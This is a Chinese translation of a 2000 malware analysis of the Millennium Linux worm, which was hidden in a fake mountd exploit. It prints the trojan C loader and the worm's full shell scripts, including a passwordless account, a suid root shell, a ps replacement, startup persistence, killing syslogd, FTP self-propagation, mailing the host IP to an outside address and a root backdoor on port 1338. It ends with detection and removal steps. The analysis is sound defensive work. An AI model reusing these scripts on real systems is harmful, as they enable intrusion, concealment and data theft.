---
title: "分析一个linux下的蠕虫"
date: 2000-06-03T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-59"
---

[quack](https://www.xfocus.net/bbs/index.php?lang=cn&act=Profile&do=03&MID=5) (quack_at_xfocus.org)

分析一个linux下的蠕虫


Max Vision <vision@whitehats.com> 

译：quack <quack@antionline.org> 


[http://focus.silversand.net  ](http://focus.silversand.net�0�2�0�2/)安全焦点


一、简介


千年蠕虫(The Millennium Internet Worm)――后面简称worm，是一段script及程

序组成的，它执行的功能是利用linux系统的某些远程漏洞，获取该系统的进入权限，并且

将自身复制到其上并继续繁殖。现在发现的worm是针对x86的linux中imap4v10.X,

Qualcomm popper, bind , rpc.mountd 这些存在明显漏洞的服务进攻的。但它也做

了一件好事――修补了安全漏洞……


二、技术分析


我们最早发现的蠕虫据称是在ADMmountd2的远程漏洞利用程序中的(这个程序是对linux的

rpc.mountd服务进行攻击并可获取最高权限――这里不详述)，但ADM组织否认曾经发布过带

有该特洛伊程序的代码，并将其归类于假冒ADM作品，可以参见

[ftp://adm.freelsd.net/ADM/FAKES/](ftp://adm.freelsd.net/ADM/FAKES/) maintained by ndubee@df.ru].


这个木马是放在ADMmountd的所谓更新版本中，并在措词中表明这一版本的利用程序更为实用，

但其实隐蔽的代码就躲在ADMgetip.c中，ADM在其站点限制了对这一工具的下载，所以这里我

把它提供给大家，仅仅是用于教育目的――这一木马于1999-8-15被发现。


你可以在[http://focus.silversand.net/newsite/tool/adm_fake.c](http://focus.silversand.net/newsite/tool/adm_fake.c)下载ADMgetip-TROJAN-VERSION.c。


1、原型 


该代码段中有一段mworm.tgz的uuencode代码，当运行该程序时，它会被展开于目录

/var/tmp/tmp，并且执行一个名为wormup的程序，代码段如下：


//Trojan Code from ADMgetip.c  


FILE *fp=fopen("/var/tmp/tmp","w"); //打开文件

if(getuid()!=0) { fprintf(stderr,"operation not permitted\n"); exit(0); }

//检查uid是否为root

fprintf(fp,"begin-base64 644 mworm.tgz

H4sIANpU/TYAA+xaD3CUx3XfOx1wHALEHxts4/hDRrYE0vHdSQJkgQsIYWhk

UCSQHSM4n+6+4ztxujvfHypiuwEr1DqEYsWeTp1MUhOctEnr6biMnSbFY8vA

YNyBlGB3ShonZVy3ORmSIZgabMtcf293v7vvOwk7k4k7k5l8o3f7vd23b9++

...  [ large uuencoded mworm.tgz here ]

emgL0uE1iuMHR6u1MaA8jUhjOHm2+OzzGLqoNLv0SRpBuNS6XmDYdwe6Z55f

bYCEt3q80+XpdMU1NM8J2FDCra2crXTRduAMD0Johcwe8ODFVzDnnwNKJcF8

ivJ+7s3IgAEDBgwYMGDAgAEDBgwYMGDAgAEDPxS+AlHjZQIA+AIA

====\n"); //这是一段很长的uuecoded过的代码

system("( cd /var/tmp;uudecode < tmp ; sleep 1; tar xzvf mworm.tgz;\

 ./wormup ) >/dev/null 2>/dev/null &"); //解码并执行wormup程序


注意如果权限并非root的话，是无法继续的，该mworm.tgz展开后有如下文件：


Directory of /var/tmp 


-rw-r--r--   1 root     root        51564 Aug 17 22:21 mworm.tgz

-rwxr-xr-x   1 root     root         8647 Dec 31  1999 Hnamed*

-rwxr-xr-x   1 root     root         5173 Dec 31  1999 Hnamed.c*

-rwxr-xr-x   1 root     root          477 Dec 31  1999 IP*

-rwxr-xr-x   1 root     root         1728 Dec 31  1999 README-ADMINS*

-rwxr-xr-x   1 root     root         5749 Dec 31  1999 bd*

-rwxr-xr-x   1 root     root         1340 Dec 31  1999 bd.c*

-rwxr-xr-x   1 root     root            0 Dec 31  1999 cmd*

-rwxr-xr-x   1 root     root         5292 Dec 31  1999 ftpscan*

-rwxr-xr-x   1 root     root          911 Dec 31  1999 ftpscan.c*

-rwxr-xr-x   1 root     root         8750 Dec 31  1999 ftpx*

-rwxr-xr-x   1 root     root         5108 Dec 31  1999 ftpx.c*

-rwxr-xr-x   1 root     root         2398 Dec 31  1999 getip.c*

-rwxr-xr-x   1 root     root         6436 Dec 31  1999 im*

-rwxr-xr-x   1 root     root         2634 Dec 31  1999 im.c*

-rwxr-xr-x   1 root     root          151 Dec 31  1999 infect*

-rwxr-xr-x   1 root     root            1 Dec 31  1999 infected*

-rwxr-xr-x   1 root     root         2755 Dec 31  1999 ip_icmp.h*

-rwxr-xr-x   1 root     root         6175 Dec 31  1999 mount.h*

-rwxr-xr-x   1 root     root         5152 Dec 31  1999 mount.x*

-rwxr-xr-x   1 root     root         2222 Dec 31  1999 mount_clnt.c*

-rwxr-xr-x   1 root     root         3178 Dec 31  1999 mount_svc.c*

-rwxr-xr-x   1 root     root         2366 Dec 31  1999 mount_xdr.c*

-rwxr-xr-x   1 root     root        13048 Dec 31  1999 mountd*

-rwxr-xr-x   1 root     root         7723 Dec 31  1999 mountd.c*

-rwxr-xr-x   1 root     root          668 Dec 31  1999 mwd*

-rwxr-xr-x   1 root     root          561 Dec 31  1999 mwd-ftp*

-rwxr-xr-x   1 root     root          448 Dec 31  1999 mwd-imap*

-rwxr-xr-x   1 root     root          355 Dec 31  1999 mwd-mountd*

-rwxr-xr-x   1 root     root          529 Dec 31  1999 mwd-pop*

-rwxr-xr-x   1 root     root          755 Dec 31  1999 mwi*

-rwxr-xr-x   1 root     root          844 Dec 31  1999 mworm*

-rwxr-xr-x   1 root     root         4617 Dec 31  1999 mwr*

-rwxr-xr-x   1 root     root          407 Dec 31  1999 mwr.c*

-rwxr-xr-x   1 root     root         5849 Dec 31  1999 mws*

-rwxr-xr-x   1 root     root         1522 Dec 31  1999 mws.c*

-rwxr-xr-x   1 root     root         1439 Dec 31  1999 pgp*

-rwxr-xr-x   1 root     root         1226 Dec 31  1999 prepare*

-rwxr-xr-x   1 root     root         5430 Dec 31  1999 q*

-rwxr-xr-x   1 root     root         1350 Dec 31  1999 q.c*

-rwxr-xr-x   1 root     root         6785 Dec 31  1999 qp*

-rwxr-xr-x   1 root     root         2886 Dec 31  1999 qp.c*

-rwxr-xr-x   1 root     root         5680 Dec 31  1999 remotecmd*

-rwxr-xr-x   1 root     root         1834 Dec 31  1999 remotecmd.c*

-rwxr-xr-x   1 root     root         7286 Dec 31  1999 test*

-rwxr-xr-x   1 root     root         4355 Dec 31  1999 test.c*

-rwxr-xr-x   1 root     root         1037 Dec 31  1999 wormup*


在该文件展开后，第一件事就是执行wormup代码，内容如下：


# cat wormup


#!/bin/sh

# MILLENNIUM WORM SETUP SCRIPT

# ./wormup -dist = create a new build

# ./wormup & = install the worm (root)

if [ x$1 = "x-dist" ]

then

echo "Creating Millennium Worm distribution."

indent *.c

rm -f *~

echo -n "Compiling: "

for C in Hnamed q bd im qp ftpscan mwr remotecmd ftpx mws test

do

rm -f $C

gcc -Wall -O2 ${C}.c -o $C

echo -n $C" "

done

rm -f mountd

rpcgen -C mount.x && gcc -Wall -O2 mountd.c -o mountd \

>/dev/null 2>/dev/null

echo "mountd ..done"

echo -n "Fixing misc. file stuff... "

printf "" > cmd

printf "0" > infected

chmod 755 *

touch -t 010100002000.00 *

echo "done."

rm -f mworm.tgz

tar czf mworm.tgz *

echo "Finished. mworm.tgz recreated."

exit 0

fi

if [ $UID != 0 ] ; then

echo You need root to screw up this machine, sorry.

exit 0

fi

cp /bin/sh /bin/.mwsh && chmod 4755 /bin/.mwsh

mkdir /tmp/.... && cp mworm.tgz /tmp/....

echo mw::2222:555:millennium worm:/:/bin/sh >>/etc/passwd

cd /tmp/.... && tar xzvf mworm.tgz

./mworm >/dev/null 2>/dev/null &

echo "Millennium Worm(tm). Phear thy unix like thyself."


这段代码做了以下几件事情


    删除并且重新编译worm.tgz里的二进制文件。

    准备通过网络感染的程序

    给cmd文件清零，以便稍候使用

    给infected文件清零，用来充当counter

    将所有文件的许可权限设为755

    将所有文件的时间戳设为2000-1-1, 00:00:00 

    重新将mworm.tgz这家伙打好包放在/var/tmp中


2、在本地机器上的行为


当它被安装于机器中时，该蠕虫会运行wormup脚本执行下面的工作：


    建立一个没有密码的帐号mw

    拷贝一个suid的root shell到/tmp/.mwsh 

    发动蠕虫


在蠕虫发动后，会有下列情况发生：


    蠕虫会把自己加在/etc/rc.d/rc.local以及/etc/profile中

    将系统的IP地址发送到trax31337@hotmail.com这个email地址

    通过随意地扫描并攻击网络其它主机，将自身复制到上面


3、在网络中的行为 


任何被获得了root权限并安装了蠕虫的机器都会被激活并参与展开进攻感染行为，需要记住，该脚本有一

个-dist的选项并没有被马上使用到，首先我们先看它做什么：


    建立一个suid的root shell/tmp/.mwsh 

    在/etc/passwd中加入一个名为mw，uid为2222，密码为空的帐号

    将mworm.tgz展开到/tmp/...

    执行mworm


#cat .mworm 


#!/bin/.mwsh

# Millennium Worm by Anonymous

# If you found this on your machine, but didn't download it

# well.. you have a problem :)

export PATH="/bin/:/usr/sbin/:/usr/bin:/sbin:/usr/local/bin:."

export IP_A=`./IP`


./prepare for your d00m mortalz


cat << _EOF_ > cmd

mw

mw

mw

mw

mw

/bin/.mwsh -c "/usr/sbin/named" &

export PATH="/bin/:/usr/sbin/:/usr/bin:/sbin:/usr/local/bin:."

mkdir /tmp/....

cd /tmp/....

if [ -f /tmp/.X12 ]

then

logout

fi

ftp $IP_A

mw


cd /tmp/....

get mworm.tgz

bye

tar xvzf mworm.tgz

touch /tmp/.X12

nohup ./mworm &

./IP | mail `printf "\x74\x72\x61\x78\x33\x31\x33\x33\x37\x40\

\x68\x6f\x74\x6d\x61\x69\x6c\x2e\x63\x6f\x6d"`

logout

_EOF_


./mwd &

./mwd-pop &

./mwd-imap &

./mwd-mountd &

./mwd-ftp &

sleep 60

nohup ./mwd &

nohup ./mwd-pop &

nohup ./mwd-imap &

nohup ./mwd-mountd &

nohup ./mwd-ftp &


/bin/.mwsh -c ./bd


 

这段脚本看来是这个worm的核心所在了，它执行下面功能：


    运行准备好的脚本――附于下面

    建立一个cmd脚本――是将对目标机器执行的命令

    发送email――包含该主机的IP地址――到trax31337@hotmail.com

    发动守护进程mwd, mwd-pop, mwd-imap, mwd-mountd, and mwd-ftp 

    运行bd，这是一个后门，绑定端口1338并允许在收到验证密码为millennium后以root身份进入。

    

#cat prepare


#!/bin/.mwsh

# Millennium Worm Preparation File

# This sets up the stuff to make sure your

# machine will be owned in a neat and proper way ;D


export PATH="/bin/:/usr/sbin/:/usr/bin:/sbin:/usr/local/bin:."


if [ -f /bin/.ps ]

then

printf ""

else

./README-ADMINS >/dev/null 2>/dev/null &

mv /bin/ps /bin/.ps;echo "/bin/.ps \$* | grep -v ps | grep -v mw | \

grep -v grep" >> /bin/ps ; chmod 755 /bin/ps

if [ -f /etc/rc.d/rc.local ]

then

echo "( sleep 10 ; cd /tmp/..../ ; ./mworm ) >>/dev/null & " \

>> /etc/rc.d/rc.local

else

echo "( sleep 10 ; cd /tmp/..../ ; ./mworm ) >>/dev/null & " \

>> /etc/profile

fi

chattr +ia /tmp/..../*.c /tmp/..../mwd* /tmp/..../prepare /bin/.mwsh

chattr +ia /etc/rc.d/rc.local /etc/profile /tmp/..../mwo* /tmp/..../IP

chattr -ia /tmp/..../mount_*.c

fi


killall -q -9 syslogd


gcc -Wall -O2 Hnamed.c -o Hnamed

gcc -Wall -O2 mwr.c -o mwr

gcc -Wall -O2 q.c -o q

gcc -Wall -O2 remotecmd.c -o remotecmd

gcc -Wall -O2 test.c -o test

gcc -Wall -O2 bd.c -o bd

gcc -Wall -O2 im.c -o im

gcc -Wall -O2 qp.c -o qp

gcc -Wall -O2 mws.c -o mws

gcc -Wall -O2 ftpscan.c -o ftpscan

gcc -Wall -O2 ftpx.c -o ftpx

rpc=`which rpcgen`

which rpcgen && $rpc -C mount.x && gcc -Wall -O2 mountd.c -o mountd


/bin/.mwsh -c ./bd &


 

不用多说了，这段脚本执行了下面的工作：


    运行了"README-ADMINS"，将主机弄安全些。

    将ps用假的替换掉，以便隐藏该worm

    将自己加到系统开始时的rc文件中

    将worm的文件变为不可更改，不可删除――但root可以用chattr来改变

    杀掉syslogd

    运行bd，打开1338的root shell允许远程root以millennium密码登入

    

三、删除蠕虫


1、检测主机：


    /etc/passwd中有一个密码为空的mw帐号

    /tmp/.mwsh存在并且是一个suid的root shell

    /tmp/....夹存在并且里面有worm的一些文件

    /etc/rc.d/rc.local的文件被更改并且放入了mworm，以便自启动

    /etc/profile文件被更改

    syslogd进程莫名其妙地终止了

    mountd被停掉了

    dns服务被过滤掉

    qpop和imap被升级了;)

    /etc/hosts.deny和/etc/hosts.allow被清空

    下面的进程在跑.mwsh, mworm, Hnamed, remotecmd, mwd, mwd-ftp, 

    mwd-imap, mwd-pop, mwd-mountd, ps ("bd" 的后门伪装成的ps) 

    

    

2、检查网络：


    有email外发至trax31337@hotmail.com

    有名为mw的用户从ftpd服务登入或者收到mworm.tgz文件

    (这两个检测并不一定准确，因为syslogd被停了，如果有设代理的话则可能在代理的记录里可能找到)

    tcp连接到端口1338――绑定的后门

    从53端口的外发信息――可能是bind漏洞攻击

    从110端口的外发信息――可能是qpopper漏洞攻击

    从143端口的外发信息――可能是imapd漏洞攻击

    从635端口的外发信息――可能是rpc.mountd漏洞的攻击

    从23端口的外发信息――可能是worm在通过remotecmd散布

    

    

3、预防


升级――worm是利用系统的远程漏洞获得roo权限才能攻击的，如果升级到最新的版本，就不会存

在这些特殊而且明显的漏洞了，那么也就有效地将worm阻于门外，不过要记住，任何一个攻击者

都可以轻易地将这个worm稍加更改用于现在的系统，现在的漏洞，来攻击你现在的机器;)，所以最

的的办法只能是关注网络安全;)


红帽子的用户可以到[http://www.redhat.com/errata/](http://www.redhat.com/errata/)获取相关信息


4、修复


如果已经被worm感染的话，要修复它是很容易的，你只需要：


    删除suid的root shell[/bin/rm -rf /tmp/.mwsh] 

    停止运行中的worm进程[/usr/bin/killall -9 mworm] 

    去除在mworm文件上的写保护标记[/usr/bin/chattr -R -ia /tmp/....] 

    删除worm文件[/bin/rm -rf /tmp/....] 

    将正常的ps文件拷回去[/bin/cp /bin/.ps /bin/ps]――最好重新build一个吧;)

    将mw用户从/etc/passwd中移除[/usr/sbin/userdel -r mw] 

    将worm的自启动的东西从/etc/rc.d/rc.local及/etc/profile中删除

    杀掉bd的后门的进程，如果你已经删掉了worm的文件，重新启动就可以去掉它了

    

如果你已经被worm所感染的话，那至少表明你的系统曾经完全地被别人拥有过，他有能力对系统做任

何事，所以仅仅杀掉worm的进程，删除其文件，删除mw的用户等工作仅仅是去掉了一些公式化的东西，

所以不能保证你的机器里还有些什么新奇有趣的后门或者其它东西，最好的办法――还是关注安全……
